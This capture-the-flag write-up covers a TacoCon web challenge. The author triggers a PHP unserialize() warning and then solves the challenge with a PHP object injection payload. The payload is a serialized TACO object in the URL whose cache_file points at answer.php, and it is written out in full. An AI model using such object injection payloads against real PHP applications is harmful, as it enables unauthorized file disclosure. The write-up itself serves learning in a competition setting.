# Serial Taco Eater

```
There seems to be some personal website development going on within this secure bunker.

From the looks of it, this guy really likes Tacos... it is possible that he stored some valuable information on his website.

http://challenges.tacocon.party:8000
```

This one had me stumpped for a long time. The website has a simple survey on it that submits to a secnd page and has a comment in the HTML that says the developer even names his objects after tacos. Lot of use that is, right?

Well, after a lot of playing around, I noticed that if you use a URL like this:

```
http://challenges.tacocon.party:8000/answer.php?doyoulovetacos[a]=YES
```

You'll actually receive a PHP warning:

```
Warning: unserialize() expects parameter 1 to be string, array given in /var/www/html/answer.php on line 12
```

Now that's something I can work with! After a bit of searching un the unserialize PHP command, I found that it can be exploited by PHP Object Injection. I played around with that for a bit and found that I can do the following to inject into the destructor of the TACO object and receive the key.

```
http://challenges.tacocon.party:8000/answer.php?doyoulovetacos=O:4:%22TACO%22:1:{s:10:%22cache_file%22;s:15:%22./answer.php%22;} 
```

```
TacoCon{ThisGuyShouldProbablySeeADoctor}
```
